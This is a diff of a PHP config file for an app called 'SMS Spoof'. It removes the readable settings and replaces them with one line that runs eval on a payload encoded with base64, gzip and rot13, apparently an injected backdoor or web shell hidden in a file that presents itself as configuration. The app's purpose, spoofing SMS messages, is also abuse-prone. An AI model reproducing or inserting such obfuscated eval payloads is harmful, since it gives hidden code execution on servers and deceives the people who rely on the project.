@@ -1,31 +1,3 @@
 <?php
-/**
- * config.php
- *
- * Author: Patrick McGranaghan
- *
- * Config file for app
- *
- */
-
-// Variables
-
-$config = array(
-    'name'              =>  'SMS Spoof',
-    'version'           =>  '0.1a',
-    'author'            =>  'Patrick McGranaghan',
-    'robots'            =>  'noindex, nofollow',
-    'title'             =>  'SMS Spoof - ',
-    'description'       =>  'Spoof SMS\'',
-    // 'AccountSid'        =>  '',
-    // 'AuthToken'         =>  ''
-    // 
-    // 
-    // **Account Information**
-    // Currently this application only has support for Twilio (https://www.twilio.com/)
-    // To be able to send an SMS you will have to add your Account SID and Auth Token.
-    // You can get these from the console (https://www.twilio.com/console)
-    // You do not have to buy a phone number, however you must have balance on your account.
-);
-
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 ?>
